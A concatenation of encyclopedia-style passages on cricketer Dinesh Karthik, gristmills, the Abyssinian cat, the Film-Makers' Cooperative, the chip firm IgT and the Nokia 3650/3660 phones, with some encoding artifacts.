Dipika Pallikal in November 2013, and they married in traditional Christian and Hindu ceremonies in August 2015.  Domestic career  Karthik made his first-class debut in late 2002 against Baroda as a wicket-keeper. He batted in five matches of the round-robin, scoring 179 runs at an average of 35.80 with a top score of 88 not out against Uttar Pradesh in his second match. Karthik's form tapered off after this match, and he failed to pass 20 again during the season. He took 11 catches but, due to repeated wicket-keeping errors, he was dropped from the season's final matches. Karthik was overlooked in the selection for the zonal Duleep Trophy, and played in the under-19s for South Zone. He was more productive in his second zonal season, scoring 180 runs at 60.00 with three half-centuries. He was selected for the national under-19 team, and played in three youth One Day Internationals (ODIs) against Nepal. Karthik attended a wicket-keeping camp in the off-season under, guided by former Indian keeper and chairman of selectors Kiran More, which he credited with improving his technique. After playing in the Chennai League, he returned to the under-22 team at the start of the season before his selection for India Emerging Players to play their youthful counterparts from Sri Lanka and Pakistan in late September. Karthik was recalled to the Ranji Trophy team at the beginning of the 2003-04 season. He scored 438 runs (an average of 43.80), with two centuries, and took 20 catches. In the semi-final against Railways, he scored his maiden first-class century with 122 runs. He followed this with an unbeaten 109 in the final against Mumbai. Karthik was selected for the India squad in the 2004 Under-19 Cricket World Cup in Bangladesh, and scored two half-centuries on an India A tour to Zimbabwe. He had a strong domestic first- class season in 2008-09\\\\. After starting the Ranji Trophy campaign with two single-figure scores, he scored 213 runs in partnership with Subramaniam Badrinath as Tamil Nadu defeated Uttar Pradesh by an innings. Karthik then scored 123 and 113 in consecutive matches against Baroda and Railways, before ending his Ranji Trophy campaign with 72 against Uttar Pradesh in the return match. He continued his strong run against Central Zone in the Duleep Trophy, scoring 153 (103 in one match). Karthik ended with 1,026 runs at 64.12 for the season, including five centuries and two fifties. In 2009‚Äì2010, he was the Tamil Nadu captain in six Ranji Trophy matches. Karthik scored 152 against Orissa and 117 against Punjab, adding a further two scores of at least 70. He scored only 16 runs in his four other innings, ending the season with 443 runs and an average of 55.37. Karthik was named captain of the India A cricket team for the 2018‚Äì19 Deodhar Trophy in October 2018. In October 2019, he was named to India C's squad for the 2019‚Äì20 Deodhar Trophy. Indian Premier League Karthik played in the 2008 Indian Premier League as wicket-keeper for the Delhi Daredevils, scoring 145 runs at 24.16 with a strike rate of 135.51. His highest score was an unbeaten 56 to steer Delhi to a five-wicket win in a group match against the Mumbai Indians. In the 2009 Indian Premier League hosted by South Africa, Karthik played in each of Delhi's 15 matches. He scored 288 runs at 36.00, passing 40 on three occasions and making 17 dismissals. Although Delhi topped the tournament's pool stage, Karthik made only nine in the semi-final and Delhi were defeated by six wickets by the Deccan Chargers. He was bought by Kings XI Punjab in 2011 for $900,000, making him the second-most-expensive player on their squad. For the 2012 Indian Premier League, Karthik joined Mumbai Indians for a reported $2.35 million.Dinesh Karthik transfer to Mumbai Indians He was again bought by Delhi in 2014, by Royal Challengers Bangalore in 2015 and in 2016 by the Gujarat Lions, who retained him for the 2017 season. Karthik was named wicket- keeper of the IPL XI of the tournament in 2017 by CricBuzz. He was bought by the Kolkata Knight Riders for the 2018 IPL season (replacing Gautam Gambhir), and led the team to the playoffs. For his performance in the 2018 IPL season, Karthik was named to the Cricinfo and CricBuzz IPL XI. International career =Test career= alt=Karthik, poised to run with a ball in his hand Karthik made his Test cricket debut in the fourth Test between Australia and India in Mumbai in October 2004, replacing Parthiv Patel (who was dropped for poor wicket-keeping). He scored 14 runs in two innings and took two catches, but was praised for his wicket-keeping on a pitch with variable bounce and spin on which 40 wickets fell in two days. He played in only one match against England at Lord's, scoring one run. Despite dropping England captain Michael Vaughan from Anil Kumble's bowling, he eventually stumped Vaughan down the legside and took another catch. Karthik played in the 2004 ICC Champions Trophy against Kenya, taking three catches before being replaced on the ODI team by MS Dhoni. He did not play another ODI until April 2006. Karthik was retained for India's next engagement: a two-Test home series against South Africa. In a high-scoring draw where both teams passed 450 in the first innings, Karthik managed only a solitary run in the first Test in Kanpur. In the second Test at Kolkata, he scored 46 runs to help extend India's first innings lead to 106 runs for the host's eight-wicket win. Karthik had a chance to score highly in India's two-Test tour of Bangladesh in December 2004. Against a team which had never won a Test, India swept the series and won both matches by an innings. Although his side exceeded 500 in both matches, Karthik scored only 25 and 11. However, he was retained for the three-Test series at home against Pakistan in March. In a high-scoring draw in the first Test in Mohali, Karthik scored only six of India's 516 runs. He then had his best Test batting performance to date, at Eden Gardens in Kolkata against Pakistan. India batted first; Karthik made a start and reached 28, before being run out. India made 407 and Pakistan almost broke even, replying with 393. Karthik scored in the second innings, joining Rahul Dravid in a 166-run partnership to set up a target of 422. The pitch was deteriorating, and India won the match by 196 runs. In the next match, Karthik made only 10 and nine as India collapsed and lost ten wickets on the final day of an otherwise high-scoring match; 1,280 runs had been scored for only 22 wickets in the first three innings. Dhoni scored 148 in an ODI against Pakistan, and he replaced Karthik for the three Tests at home against Sri Lanka. In ten tests since his debut, Karthik scored 245 runs for an average of 18.84 with one half-century and one other score above 25. He was selected as a back-up wicket-keeper and middle- order batsmen on the Test team in November 2006. After Dhoni injured a finger, Karthik replaced him for the third Test at Newlands against South Africa for his first Test in over a year. He opened the innings with Wasim Jaffer, allowing Sehwag to bat in the middle order. He used his domestic experience to score 63 in the first innings, combining in a century opening stand and helping India to 414 (enough for a first-innings lead of 41). In the second innings, Karthik scored an unbeaten 38 as the team were all out for 169. In addition to his batting, his wicket-keeping was praised. Although he did not play a match at the 2007 ICC Cricket World Cup, after a roster reshuffle Karthik was selected as a specialist opener for a tour of Bangladesh. He scored 56 and 22 in the drawn first Test in Chittagong before scoring his maiden Test century in the second Test in Dhaka, making 129 runs and featuring in a century opening stand as India took an innings victory. Karthik was a regular opener in the mid-2007 Test series in England. After scoring 76 and 51 in the two tour matches before the Tests, he recorded a half-century in each of the three Tests. In the first Test at Lord's, Karthik made 60 in the second innings before India fell to 9/282 (in pursuit of 380) when rain ended the match early. In the second Test at Trent Bridge, Karthik scored 77 and 22; in the third Test at the Oval, he scored 91. With a total of 263 runs at 43.83, he was the highest scorer in the series for India (who won their first series in England in 21 years). Karthik started the ODI series with an unbeaten 44, but had four consecutive innings where he failed to score more than four runs and was dropped for the final two matches. He had a lean Test series against Pakistan at home in late 2008. Karthik managed only 39 in two innings of the first two Tests, exceeding single figures only once. In the third Test in Bangalore, Sachin Tendulkar was injured; his replacement, Yuvraj, scored 170. Karthik, batting down the order, scored 24 and 52 in a high-scoring draw and kept the wickets because of Dhoni's injury. In the first innings, Karthik was behind the stumps as India set a world record for the most extras conceded in a Test innings; the 35 byes were the secondmost in Test history. Karthik was retained for the Test tour of Australia as an opener, and Gambhir was out with an injury. He did not play in the first two Tests, however, because Dravid was elevated to his opening position so Tendulkar and Yuvraj could bat in the middle order. When Dravid and Yuvraj struggled in their new positions, Dravid was moved back to his number-three position and Yuvraj was dropped for the series' third Test; Karthik was not recalled. He was recalled to the Test team as a wicket-keeper for the July 2008 tour of Sri Lanka when Dhoni took a sabbatical due to fatigue. Karthik played in the first two Tests, but struggled with the bat in the middle order. He scored 36 runs at 9.00, falling all four times to the spinners Muttiah Muralitharan and Ajantha Mendis. He scored an unbeaten 117 against Kerala in the 2009 one-day tournament and was selected for the tour of New Zealand as reserve wicket-keeper. After watching the T20 and ODI series, Karthik played in the second Test when Dhoni was injured; he was criticised for dropping a number of catches. Karthik then played in the first Test at Chittagong after Dhoni was injured again. He made a duck in the first innings and 27 in the second, watching the next match after Dhoni returned. Karthik was replaced as reserve gloveman for the two- Test home series against South Africa by Wriddhiman Saha. He scored 183 and 150 in the Duleep Trophy final against West Zone, the third player to score centuries in both innings of a Duleep Trophy final.India domestic cricket: Dinesh Karthik ton helps South retain edge  South Zone v West Zone, Duleep Trophy final, Hyderabad, 3rd day Report  Cricket News  ESPN Cricinfo =Limited over career= upright=0.8 In April 2006, Karthik was recalled to the ODI team to give Dhoni a rest in the final ODI against England in Indore. He was not required to bat, as India cruised to a seven-wicket victory. Karthik was then reinstated as reserve wicket-keeper for the tour of the West Indies after scoring 134 runs for India A at 33.50, including a man-of-the- match 75 runs against the UAE. He had more opportunities at the international level later that year during the ODI tour of South Africa after Yuvraj Singh was injured. As a batsman in three of the ODIs, Karthik struggled with 42 runs at an average of 14.00 and a top score of 17 as South Africa took a 5-0 whitewash. Dinesh Karthik's 15-year-old career includes 94 ODIs, and 32 T20s. He has kept wickets for the Indian team in ICC events and crucial trophies, both ODIs as well as T20Is. Karthik averages best in T20s 33.25 with a strike rate of 143.52. While he was snubbed in ODIs after ICC World Cup 2019, Karthik is well in contention for ICC T20 World Cup 2020. He scored an unbeaten 31 to steer India to a six-wicket win in the Twenty20 International against South Africa, with one ball to spare, in 2007. Karthik then featured in the four- match ODI series against West Indies. After not batting in the victorious first match, he top-scored with 63 as a specialist batsman when India recovered from 35/3 to post 189 on a slow wicket at the Barabati Stadium in Cuttack. India won by 20 runs, giving Karthik his first man-of-the-match award. He was then selected for the series against Sri Lanka and the 2007 Cricket World Cup. Before their tour of England, India played a series of ODIs in Ireland against the hosts and South Africa. Karthik played in four matches, scoring 15 runs at 51.00 and keeping wicket in two matches. Selected for the inaugural 2007 ICC World Twenty20 in South Africa in September 2007, he played in India's earlier matches before being replaced in the semi-final and final by Rohit Sharma. Karthik remained on the Indian squad for the home ODI series against Australia, but his form declined in England. He played in only the final match in Mumbai, making a duck as India scraped home by two wickets. = Return to form = Karthik had another chance in India's four-match tour of West Indies when he replaced Virender Sehwag, who was out with a shoulder problem.Karthik gets the nod to replace Sehwag  Cricket News  ICC World Twenty20 2009  ESPN Cricinfo He scored 67, 4 and 47 runs as an opener as India took the series, 2-1.India snatch lead with last-over win  West Indies v India, 3rd ODI, St Lucia Report  Cricket News  ESPN Cricinfo India snatch high-scoring thriller  West Indies v India, 1st ODI, Kingston Report  Cricket News  ESPN Cricinfo Dravid primed for ODI return  Cricket News  ESPN Cricinfo Karthik was retained for a short triangular ODI tournament in Sri Lanka in September. He scored 4 and 16 in India's two round-robin matches and was dropped for the final, in which India defeated the hosts. Karthik was retained for the 2009 ICC Champions Trophy in South Africa, but after his performances in Sri Lanka he was omitted for the first two matches. Although he had an opportunity in India's final pool match against the West Indies and scored 34 in a seven-wicket win, it was not enough to prevent India's first- round exit. Karthik during the 2013 ICC Champions Trophy In December 2009, Karthik was recalled to the ODI team during the Sri Lankan tour of India after Dhoni was banned after the second match for two matches because of low over rates. Karthik kept wickets in the next two matches, scoring 32 and 19 (unbeaten in both) and helping guide India to the target in successful run chases. He retained his place as a middle-order batsman in the fifth and final match when Dhoni returned after Tendulkar was rested and Yuvraj was injured, but the match was ended early due to an unsafe pitch. Karthik retained his place for the ODI tri-series in Bangladesh against the hosts and Sri Lanka after Tendulkar was rested for the tournament. He was an opener with Gambhir in the last two of the round-robin matches, after Sehwag was rested. Although Karthik made 48 and 34 in quick time as India won both matches, he was dropped for the final (which India lost). Karthik was recalled to the Indian ODI team for the 2013 ICC Champions Trophy after a good domestic season and IPL performance. He scored back-to-back centuries in the two warm-up games, securing his place on the team for the tournament. On 10 December 2017 Karthik faced 18 deliveries without scoring a run against Sri Lanka, an ODI record. He was flown in for the third Test of India's 2017‚Äì18 tour of South Africa to replace the injured wicket-keeper, Saha. The substitute, Patel, was included on the side before he injured his right index finger; Karthik began keeping the wickets on day four of the Test. Although he was on the squad for the limited-overs matches, he did not make the playing eleven (except for the final T20I, when he made a six-ball 13). Karthik was again named to the squad for the March 2018 Nidahas Trophy, Tri-nation series, after team regular (and wicket-keeper) Dhoni was rested. He played a match-winning knock of an unbeaten 29 off eight balls in the final of the tournament against Bangladesh. Coming to bat when India required 34 runs off the last two overs, Karthik's assault (which included a six when requiring five runs off the last ball) won the match and the tournament. In April 2019, he was named to India's squad for the 2019 Cricket World Cup. On 6 July, in the match against Sri Lanka, Karthik played his 150th international match for India.

The term can refer to either the grinding mechanism or the building that holds it. Grist is grain that has been separated from its chaff in preparation for grinding. History =Early history= shabti, a funerary figurine placed in the tomb to work in place of the deceased in the hereafter. Brooklyn Museum The basic anatomy of a millstone. This diagram depicts a runner stone. The Greek geographer Strabo reports in his Geography a water-powered grain-mill to have existed near the palace of king Mithradates VI Eupator at Cabira, Asia Minor, before 71 BC.; Grinding mechanism in an old Swedish flour mill The early mills had horizontal paddle wheels, an arrangement which later became known as the \\"Norse wheel\\", as many were found in Scandinavia. The paddle wheel was attached to a shaft which was, in turn, attached to the centre of the millstone called the \\"runner stone\\". The turning force produced by the water on the paddles was transferred directly to the runner stone, causing it to grind against a stationary \\"bed\\", a stone of a similar size and shape. This simple arrangement required no gears, but had the disadvantage that the speed of rotation of the stone was dependent on the volume and flow of water available and was, therefore, only suitable for use in mountainous regions with fast-flowing streams. This dependence on the volume and speed of flow of the water also meant that the speed of rotation of the stone was highly variable and the optimum grinding speed could not always be maintained. Vertical wheels were in use in the Roman Empire by the end of the first century BC, and these were described by Vitruvius. The peak of Roman technology is probably the Barbegal aqueduct and mill where water with a 19-metre fall drove sixteen water wheels, giving a grinding capacity estimated at 28 tons per day. Water mills seem to have remained in use during the post-Roman period. Manually operated mills utilizing a crank-and-connecting rod were used in the Western Han Dynasty. There was an expansion of grist-milling in the Byzantine Empire and Sassanid Persia from the 3rd century AD onwards, and then the widespread expansion of large-scale factory milling installations across the Islamic world from the 8th century onwards. Geared gristmills were built in the medieval Near East and North Africa, which were used for grinding grain and other seeds to produce meals.Donald Routledge Hill (1996), \\"Engineering\\", p. 781, in Gristmills in the Islamic world were powered by both water and wind. The first wind-powered gristmills were built in the 9th and 10th centuries in what are now Afghanistan, Pakistan and Iran.Adam Lucas (2006), Wind, Water, Work: Ancient and Medieval Milling Technology, p. 65, Brill Publishers, The Egyptian town of Bilbays had a grain-processing factory that produced an estimated 300 tons of flour and grain per day. The old water mill at Decew Falls, Niagara Escarpment, St. Catharines, Canada From the late 10th century onwards, there was an expansion of grist-milling in Northern Europe. In England, the Domesday survey of 1086 gives a precise count of England's water- powered flour mills: there were 5,624, or about one for every 300 inhabitants, and this was probably typical throughout western and southern Europe. From this time onward, water wheels began to be used for purposes other than grist milling. In England, the number of mills in operation followed population growth, and peaked at around 17,000 by 1300.Gimpel, J., The Medieval Machine, Gollanz, 1976, Chapter 1. Limited extant examples of gristmills can be found in Europe from the High Middle Ages. An extant well-preserved waterwheel and gristmill on the Ebro River in Spain is associated with the Real Monasterio de Nuestra Senora de Rueda, built by the Cistercian monks in 1202. The Cistercians were known for their use of this technology in Western Europe in the period 1100 to 1350. =Classical British and American mills= Wayside Inn Grist Mill in Massachusetts Stretton Watermill, 17th-century built operational mill in Cheshire, England Although the terms \\"gristmill\\" or \\"corn mill\\" can refer to any mill that grinds grain, the terms were used historically for a local mill where farmers brought their own grain and received back ground meal or flour, minus a percentage called the \\"miller's toll.\\" Early mills were almost always built and supported by farming communities and the miller received the \\"miller's toll\\" in lieu of wages. Most towns and villages had their own mill so that local farmers could easily transport their grain there to be milled. These communities were dependent on their local mill as bread was a staple part of the diet. Classical mill designs are usually water-powered, though some are powered by the wind or by livestock. In a watermill a sluice gate is opened to allow water to flow onto, or under, a water wheel to make it turn. In most watermills the water wheel was mounted vertically, i.e., edge-on, in the water, but in some cases horizontally (the tub wheel and so-called Norse wheel). Later designs incorporated horizontal steel or cast iron turbines and these were sometimes refitted into the old wheel mills. In most wheel-driven mills, a large gear- wheel called the pit wheel is mounted on the same axle as the water wheel and this drives a smaller gear-wheel, the wallower, on a main driveshaft running vertically from the bottom to the top of the building. This system of gearing ensures that the main shaft turns faster than the water wheel, which typically rotates at around 10 rpm. The millstones themselves turn at around 120 rpm. They are laid one on top of the other. The bottom stone, called the bed, is fixed to the floor, while the top stone, the runner, is mounted on a separate spindle, driven by the main shaft. A wheel called the stone nut connects the runner's spindle to the main shaft, and this can be moved out of the way to disconnect the stone and stop it turning, leaving the main shaft turning to drive other machinery. This might include driving a mechanical sieve to refine the flour, or turning a wooden drum to wind up a chain used to hoist sacks of grain to the top of the mill house. The distance between the stones can be varied to produce the grade of flour required; moving the stones closer together produces finer flour. The grain is lifted in sacks onto the sack floor at the top of the mill on the hoist. The sacks are then emptied into bins, where the grain falls down through a hopper to the millstones on the stone floor below. The flow of grain is regulated by shaking it in a gently sloping trough (the slipper) from which it falls into a hole in the center of the runner stone. The milled grain (flour) is collected as it emerges through the grooves in the runner stone from the outer rim of the stones and is fed down a chute to be collected in sacks on the ground or meal floor. A similar process is used for grains such as wheat to make flour, and for maize to make corn meal. In order to prevent vibrations from the millstones shaking the building apart, they were usually placed on a separate timber foundation, not attached to the mill walls, known as a husk. This foundation isolated the building from vibrations coming from the stones and main gearing and also allowed for the easy re-leveling of the foundation to keep the millstones perfectly horizontal. The lower bedstone was placed in an inset in the husk with the upper runner stone above the level of the husk. =The automatic mill= American inventor Oliver Evans revolutionized the labor-intensive process of early mills at the end of the eighteenth century when he automated the process of making flour. His inventions included the Elevator, wood or tin buckets on a vertical endless leather belt, used to move grain and flour vertically upward; the Conveyor, a wooden auger to move material horizontally; the Hopper Boy, a device for stirring and cooling the newly ground flour; the Drill, a horizontal elevator with flaps instead of buckets (similar to the use of a conveyor but easier to build); and the Descender, an endless strap (leather or flannel) in a trough that is angled downward, the strap helps to move the ground flour in the trough. Most importantly, he integrated these into a single continuous process, the overall design later becoming known as the Automatic (or Automated) mill. In 1790 he received the third Federal patent for his process. In 1795 he published \\"The Young Mill-Wright and Miller‚Äôs Guide\\" which fully described the process. http://www.deltamill.org/history.html Interestingly, Evans himself did not use the term gristmill to describe his automatic flour mill, which was purpose designed as a merchant mill (he used the more general term \\"water-mill\\"). In his book his only reference to \\"grist\\" (or \\"grists\\") is to the small batches of grain a farmer would bring in to have ground for himself (what would be generally called barter or custom milling). In his book, Evans describes a system that allows the sequential milling of these grists, noting that \\"a mill, thus constructed, might grind grists in the day time, and do merchant- work at night.\\" Evans, Oliver, The Young Mill-Wright and Miller‚Äôs Guide, Oliver Evans, Philadelphia, 1795, Chapter II, pp.88-90 Over time, any small, older style flour mill became generally known as a gristmill (as a distinction from large factory flour mills). Modern mills Modern mills are highly automated. Interior in Tartu Mill, the biggest grain milling company in the Baltic states. The Pilgrim's Pride feed mill in Pittsburg, Texas, in August 2015 Modern mills typically use electricity or fossil fuels to spin heavy steel, or cast iron, serrated and flat rollers to separate the bran and germ from the endosperm. The endosperm is ground to create white flour, which may be recombined with the bran and germ to create whole grain or graham flour. The different milling techniques produce visibly different results, but can be made to produce nutritionally and functionally equivalent output. Stone-ground flour is, however, preferred by many bakers and natural food advocates because of its texture, nutty flavour, and the belief that it is nutritionally superior and has a better baking quality than steel-roller-milled flour. It is claimed that, as the stones grind relatively slowly, the wheat germ is not exposed to the sort of excessive temperatures that could cause the fat from the germ portion to oxidize and become rancid, which would destroy some of the vitamin content. Stone-milled flour has been found to be relatively high in thiamin, compared to roller-milled flour, especially when milled from hard wheat. Gristmills only grind \\"clean\\" grains from which stalks and chaff have previously been removed, but historically some mills also housed equipment for threshing, sorting, and cleaning prior to grinding. Modern mills are usually \\"merchant mills\\" that are either privately owned and accept money or trade for milling grains or are owned by corporations that buy unmilled grain and then own the flour produced.  Pests  One common pest found in flour mills is the Mediterranean flour moth. Moth larvae produce a web-like material that clogs machinery, sometimes causing grain mills to shut down.

In nomenclature terms, they are also known as simply Abys. The breed is named for Abyssinia (now called Ethiopia), where it is believed to have originated. In terms of the domestication of cats, analysis has found the Abyssinian to be one of the oldest types of the animal in existence, with mummified cats in Egyptian tombs studied by archaeologists appearing similar to the modern breed's standards. Although regarded as comparatively obscure in the past as a breed compared to others, the Abyssinian currently ranks among the top five most popular breeds worldwide. The breed's distinctive appearance, seeming long, lean, and finely colored compared to other cats, has been analogized to that of human fashion models. Personality-wise, the cats traditionally display active, curious attitudes in which they frequently follow owners around and encourage play, being regarded as the \\"Clowns of the Cat Kingdom.\\" Their dog-like characteristics also involve a particular sense of affection and desire for interaction. History Zula, the so-called \\"first Abyssinian\\" The Abyssinian cat as it is known today was bred in Great Britain. It is alleged that British soldiers deployed to North Africa in the nineteenth century returned home with kittens purchased from local traders. Description =Appearance= The Abyssinian is a slender, fine-boned, medium-sized cat. The head is moderately wedge-shaped, with a slight break at the muzzle, and nose and chin ideally forming a straight vertical line when viewed in profile. They have alert, relatively large pointed ears. The eyes are almond-shaped and are gold, green, hazel or copper depending on coat color. The legs tend to be long in proportion to a graceful body, with small oval paws; the tail is likewise long and tapering. =Coat and colors= The Abyssinian's fur exhibits a \\"ticked\\" effect. Abyssinian kittens are born with dark coats that gradually lighten as they mature, usually over several months. The adult coat should not be excessively short and is ideally fine, dense and close-lying, silky to the touch. The ticked or agouti effect that is the trademark of the breed‚Äîgenetically a variant of the tabby pattern‚Äîshould be uniform over the body, although the ridge of the spine and tail, back of the hind legs and the pads of the paws are always noticeably darker. Each hair has a light base with three or four bands of additional color growing darker towards the tip. The base color should be as clear as possible; any extensive intermingling with grey is considered a serious fault. A tendency to white on the chin is common but likewise must be minimal. The typical tabby M-shaped marking is often found on the forehead. A champion adult male showing the classic ruddy, or \\"usual\\", coat pattern The breed's original color standard is a warm deep reddish-brown base with black ticking, known as \\"usual\\" in the United Kingdom Tawny in Australia and as \\"ruddy\\" elsewhere. Sorrel (also called cinnamon or red), a lighter coppery base with chocolate brown ticking, is a unique mutation of this original pattern. Other variants have been introduced by outcrossing to the Burmese and other shorthaired breeds, notably blue (on a warm beige base) and fawn (on a softer creamy peach base). The less common chocolate and lilac are not recognized in the Cat Fancier's Association (CFA) breed standard but have been granted full champion status in The International Cat Association (TICA) and in the UK. The UK also recognizes the Silver Abyssinian, in which the base coat is a pure silvery white with black (called \\"usual silver\\"), blue, cream or sorrel ticking. Various other color combinations are in development, including the \\"torbie\\", in which a patched tortoiseshell pattern in any of these colors is visible under the tabby banding. The breed owes their distinctive coat to a dominant mutant gene known as Ta. The first cat to have its entire genome published was an Abyssinian named Cinnamon. =Temperament= Abyssinian kittens. Clockwise from bottom left: ruddy, fawn and blue. Abyssinians are a popular breed thanks in large part to their unusual intelligence and generally extroverted, playful, willful personalities. They are said to become depressed without constant activity and the attention of their owners.Pollard, Michael. The Encyclopedia of the Cat. United Kingdom: Parragon Publishing, 1999. Veterinarian Joan O. Joshua has written that the \\"dog-like attachment to the owners\\" of Abyssinian and Burmese cats causes \\"greater dependence on human contacts\\". This stands in contrast to the mere \\"tolerant acceptance of human company\\" based around \\"comforts\\" that multiple other breeds display. With their interest in playing with their owners combined with their curious intelligence, Abyssinians are known as the \\"Clowns of the Cat Kingdom\\". They have an active, outgoing nature, yet tend to be quiet cats. They have soft chirrup-like vocalizations which do not sound like the expected \\"meow\\". They are affectionate and friendly toward people. Health The breed can be prone to gingivitis, which can lead to more serious periodontitis. Familial renal amyloidosis or AA amyloidosis, a kidney disorder due to a mutation in the AA amyloid protein gene, has been seen in Abyssinians. The Abyssinian has had severe problems with blindness caused by a hereditary retinal degeneration due to mutations in the rdAc gene. However, the prevalence has been reduced from 45% to less than 4% in 2008 in the country of Sweden. With the widespread availability of rdAc mutation detection tests and services, such as those provided by the UC Davis Veterinary Genetics Laboratory, it is possible to reduce the disease frequency in all populations of Abyssinian. =Genetic diversity= The 2008 study \\"The Ascent of Cat Breeds: Genetic Evaluations of Breeds and Worldwide Random-bred Populations\\" by Lipinski et al. conducted at UC Davis by the team led by leading feline geneticist Dr Leslie Lyons found that the Abyssinian has a low level of genetic diversity, a heterozygosity value of 0.45 within a range of 0.34‚Äì0.69 for all breeds studied, and has genetic markers common to both Southeast Asian and Western breeds indicating that cats from both Asia and Europe were used to create the breed. Related breed Somali cats are the same genetic stock as Abyssinians but are recessive for a gene responsible for long-hair. Ocicats came about from the accidental crossbreeding of Abyssinians and Siamese breeds.

History In the fall of 1960, Jonas Mekas and Lewis Allen organized several meetings with independent filmmakers in New York City that culminated on September 28, 1960 with them officially declaring themselves the New American Cinema Group. Two days later on Sept. 30, Mekas presented the first draft of a manifesto for the Group, which included a call to form a cooperative distribution center. On January 7, 1961, at a contentious meeting of the Group, Amos Vogel attempted to stonewall the formation of the distribution center claiming that his own Cinema 16 organization should be the only distributor of experimental films. However, Vogel is shouted down after it was pointed out that Cinema 16 refused to distribute Stan Brakhage's Anticipation of the Night. The Film-Makers' Cooperative would officially start distributing films in 1962. Description The Film-Makers' Cooperative holds a large collection of avantgarde and experimental films, with over 5,000 titles by more than 900 filmmakers.Rohter, Larry. \\"Distributor of Avant-Garde Films Threatened With Eviction\\" The New York Times. 10 Feb. 2009. The collection includes work authored on 35mm, 16mm, 8mm, video and DVD. The Cooperative rents out the films in its collection to cin√©matheques, film festivals, schools, universities, museums, and other art institutions in the United States and around the world. Based upon a belief common to the founding members that the \\"official cinema is running out of breath\\" and has become \\"morally corrupt, aesthetically obsolete, thematically superficial, temperamentally boring\\" (as the original 1962 manifestoHistory would have it), the Film-Makers' Cooperative was a key institution in the heyday of American experimental or \\"underground\\" film in the 1960s and 1970s, and has continued to operate on a non-exclusive basis to ensure the existence of an alternative, non-commercial film culture since then. The Film-Makers' Cooperative is open to anyone who wishes to become a member. The New York Film-Makers' Cooperative has inspired similar initiatives both within the United States (Canyon Cinema in San Francisco) and abroad (The London Film-Makers' Co-operative in England, and ABCinema in Denmark, and elsewhere). Besides distributing its members' films, the Film-Makers' Cooperative is continuously involved in film preservation and DVD release projects, and in arranging screenings and events in and around New York City.

IgT was one of the first companies to focus on semiconductors for the communications marketplace. At its peak, IgT had 60 employees, 45 in its headquarters in Gaithersburg, Maryland and 15 in the San Jose, California office. IgT's logo showed an idealized waveform of a T1 signal. Early products IgT's first product was a B8ZS framer device for the T1 market. IgT also introduced an OC-3 ATM framer device that was competitive in the marketplace. This device was designed by Imran Chaudhri who was a central figure in many of IgT's developments. The name The acronym IgT was used because IGT was already in use by International Game Technology. The acronym ITT also could not be used given the historic firm ITT in the telecom industry. IgT did own the domain name igt.com, which has subsequently been sold back to IGT. Samsung relationship In January 1994, IgT engaged with the Telecom division of Samsung in Korea to build an ATM Switch chip set for use in the StarRacer system. This chip set was developed under contract with Network Synthesis, Inc. known as \\"NSI\\", a small chip design firm. This led to the investment and eventual majority ownership of IgT by Samsung. Network Synthesis acquisition In June 1996 IgT acquired NSI, whose CEO and principal design engineer, Brian Holden, became CTO of IgT. NSI was also developing an AAL-1 SAR known as the AAL1gator under contract with IgT. After the acquisition, the AAL1gator became a very successful product and drove IgT's eventual acquisition by PMC-Sierra, Inc. The AAL1gator was also a contributing factor in the acquisitions of OnStream Networks by 3Com in 1996 and Sentient Networks by Cisco Systems in 1998; both of these companies had developed systems that strongly leveraged the AAL1gator's capabilities. Joint development with Ericsson The San Jose office also developed an ATM switch chip set in a joint development with Ericsson Telecom of Sweden. Chee Hu was a central figure in this development. This was a multi-year development that led to the successful AXD-301 ATM switch deployment by Ericsson. This system was used heavily in British Telecom's network. This chipset led to 9 ATM related patents being awarded to IgT and PMC-Sierra. PMC-Sierra acquisition The AAL1Gator device was designed to connect to T1/E1 framers sold by PMC-Sierra. The runaway success of the AAL1gator device drove the sales of many additional T1/E1 framers by PMC. This led to the acquisition of IgT by PMC-Sierra, Inc. in May 1998 for USD $55M. This was also driven by the Asian financial crisis of 1997/1998 which caused Samsung to become interested in selling its interest in the company. The AAL1gator also sold well for PMC-Sierra. Update In 2003 PMC-Sierra shut down the IgT office in Gaithersburg, Maryland laying off all of the remaining employees there. A number of the San Jose office employees remain with the company. Several of the devices produced by IgT remain for sale by PMC. A number of other devices were discontinued when LSI Logic dropped support for the fabrication process in which they were made. IgT in Retrospect Despite the shutdown of the IgT design center in Gaithersburg in the aftermath of the telecom bubble, IgT was a fair investment for PMC-Sierra. The substantial rate of return from IgT is due to the combination of the moderate price paid by PMC, the strong financial return provided by the AAL1gator family of products, and the contribution of the remaining San Jose team to several successful PMC projects, including the strong selling Arrow2xGE Ethernet over SONET mapping device. When evaluated on a rate of ROI basis (rate of Return on Investment), IgT likely ranks second amongst the 14 Sierra/PMC-Sierra acquisitions, behind the acquisition of PMC by Sierra Semiconductor.

It runs Symbian OS Series 60 (version 1.2). A very distinctive feature of the Nokia 3650/3600 was its unique retro circular keypad. Many owners would have preferred a Series 60 device with a conventional keypad, however some stated that the rotary style keypad made text messaging easier and faster. This device improved on several things compared to 7650, such as expandable memory, improved battery, and camcorder capability, and it retailed for a lower price upon release in early 2003. It also had support for Xpress-On covers. The 3600 was the first Symbian OS device to appear in American markets. It was also the first phone with an integrated camera announced for the North American market. A Nokia 3650 Improved versions called the Nokia 3660/3620 were announced a year later. By that time the business-oriented Nokia 6600 was released as the company's flagship Series 60 smartphone. The official successor to the 3660 was the Nokia 3230; no official successor was released for the 3620, however, it was replaced in the Cingular Wireless (now AT&T; Mobility) lineup by the Nokia 6620 shortly after their acquisition of AT&T; Wireless Services. Variants =Nokia 3660/3620= A hardware revision of the 3600 series called the Nokia 3660 (or 3620 in North America), was announced on October 9, 2003 to replace the 3600 and 3650, addressing complaints by some users over the original phone's circular keypad design. As with the original 3600/3650, the 3620/3660 run on Series 60 version 1.x on Symbian OS. Changes from the 3600/3650 include a conventional keypad (as opposed to the 3650's circular keypad), and a 16-bit display (as opposed to the 3650's 12-bit display). Both the 3620 and 3660 are basically the same phone, except that the Nokia 3620, being targeted at the US market, operates on GSM 850/1900, while the Nokia 3660, a European phone, operates on GSM 900/1800/1900.

